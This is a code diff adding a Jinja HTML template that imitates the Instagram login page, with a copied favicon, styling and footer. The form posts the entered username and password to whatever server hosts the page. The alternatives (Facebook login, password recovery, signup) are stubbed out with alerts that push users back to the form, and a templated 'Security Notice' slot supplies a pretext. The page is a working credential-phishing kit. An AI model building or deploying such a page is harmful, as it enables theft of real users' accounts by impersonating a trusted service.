@@ -1,0 +1,257 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Instagram</title>
+    <link
+      rel="icon"
+      href="https://static.cdninstagram.com/rsrc.php/v3/yI/r/VsNE-OHk_8a.png"
+    />
+    <style>
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+        font-family:
+          -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+      }
+      body {
+        background-color: #fafafa;
+        color: #262626;
+      }
+      .container {
+        max-width: 935px;
+        margin: 0 auto;
+        padding: 30px 20px;
+      }
+      .main-content {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        min-height: 80vh;
+        gap: 60px;
+      }
+      .login-section {
+        width: 350px;
+      }
+      .login-box {
+        background: #fff;
+        border: 1px solid #dbdbdb;
+        padding: 30px 40px;
+        text-align: center;
+        margin-bottom: 10px;
+      }
+      .logo {
+        font-family: "Billabong", cursive;
+        font-size: 48px;
+        margin: 20px 0 30px;
+        color: #262626;
+      }
+      .login-form input {
+        width: 100%;
+        padding: 9px 0 7px 8px;
+        margin-bottom: 6px;
+        border: 1px solid #dbdbdb;
+        border-radius: 3px;
+        background: #fafafa;
+        font-size: 12px;
+      }
+      .login-form input:focus {
+        border-color: #a8a8a8;
+        outline: none;
+      }
+      .login-btn {
+        width: 100%;
+        padding: 7px 16px;
+        background: #0095f6;
+        border: none;
+        border-radius: 8px;
+        color: #fff;
+        font-weight: 600;
+        font-size: 14px;
+        margin: 12px 0;
+        cursor: pointer;
+      }
+      .divider {
+        display: flex;
+        align-items: center;
+        margin: 18px 0;
+        color: #8e8e8e;
+        font-size: 13px;
+        font-weight: 600;
+      }
+      .divider::before,
+      .divider::after {
+        content: "";
+        flex: 1;
+        border-bottom: 1px solid #dbdbdb;
+      }
+      .divider::before {
+        margin-right: 15px;
+      }
+      .divider::after {
+        margin-left: 15px;
+      }
+      .fb-login {
+        color: #385185;
+        font-weight: 600;
+        text-decoration: none;
+        display: block;
+        margin: 15px 0;
+        font-size: 14px;
+      }
+      .fb-login i {
+        margin-right: 8px;
+      }
+      .forgot-password {
+        color: #00376b;
+        font-size: 12px;
+        text-decoration: none;
+        display: block;
+        margin: 15px 0;
+      }
+      .signup-box {
+        background: #fff;
+        border: 1px solid #dbdbdb;
+        padding: 20px;
+        text-align: center;
+        font-size: 14px;
+        margin-bottom: 20px;
+      }
+      .signup-box a {
+        color: #0095f6;
+        font-weight: 600;
+        text-decoration: none;
+      }
+      .app-download {
+        text-align: center;
+      }
+      .security-notice {
+        background: #fff8e1;
+        border: 1px solid #ffd54f;
+        border-radius: 3px;
+        padding: 12px;
+        margin-bottom: 15px;
+        font-size: 12px;
+        color: #5d4037;
+      }
+      .security-notice strong {
+        color: #e65100;
+      }
+      .footer {
+        text-align: center;
+        padding: 30px;
+        color: #8e8e8e;
+        font-size: 12px;
+      }
+      .footer-links {
+        margin-bottom: 15px;
+      }
+      .footer-links a {
+        color: #8e8e8e;
+        text-decoration: none;
+        margin: 0 8px;
+        font-size: 12px;
+      }
+      .footer-links a:hover {
+        text-decoration: underline;
+      }
+    </style>
+    <style>
+      @font-face {
+        font-family: "Billabong";
+        src: url("https://fonts.cdnfonts.com/s/13949/Billabong.woff")
+          format("woff");
+        font-weight: normal;
+        font-style: normal;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <div class="main-content">
+        <div class="login-section">
+          <div class="login-box">
+            <div class="logo">Instagram</div>
+            {% if security_message %}
+            <div class="security-notice">
+              <strong>Security Notice:</strong> {{ security_message }}
+            </div>
+            {% endif %}
+            <form method="post" class="login-form">
+              <input
+                type="text"
+                name="username"
+                placeholder="Phone, username, or email"
+                required
+              />
+              <input
+                type="password"
+                name="password"
+                placeholder="Password"
+                required
+              />
+              <button type="submit" class="login-btn">Log in</button>
+            </form>
+            <div class="divider">OR</div>
+            <a href="#" class="fb-login" onclick="showFbLogin()">
+              <i>📘</i> Log in with Facebook
+            </a>
+            <a href="#" class="forgot-password" onclick="showForgotPassword()"
+              >Forgot password?</a
+            >
+          </div>
+          <div class="signup-box">
+            Don't have an account?
+            <a href="#" onclick="showSignup()">Sign up</a>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="footer">
+      <div class="footer-links">
+        <a href="#">Meta</a>
+        <a href="#">About</a>
+        <a href="#">Blog</a>
+        <a href="#">Jobs</a>
+        <a href="#">Help</a>
+        <a href="#">API</a>
+        <a href="#">Privacy</a>
+        <a href="#">Terms</a>
+        <a href="#">Locations</a>
+        <a href="#">Instagram Lite</a>
+        <a href="#">Threads</a>
+        <a href="#">Contact Uploading & Non-Users</a>
+        <a href="#">Meta Verified</a>
+      </div>
+      <div>© 2024 Instagram from Meta</div>
+    </div>
+
+    <script>
+      function showFbLogin() {
+        alert(
+          "Facebook login is temporarily unavailable. Please use Instagram login.",
+        );
+        return false;
+      }
+
+      function showForgotPassword() {
+        alert(
+          "Password recovery is currently unavailable. Please try again later.",
+        );
+        return false;
+      }
+
+      function showSignup() {
+        alert("Sign up feature is under maintenance. Please try again later.");
+        return false;
+      }
+
+      document.addEventListener("DOMContentLoaded", function () {
+        document.querySelector('input[name="username"]').focus();
+      });
+    </script>
+  </body>
+</html>
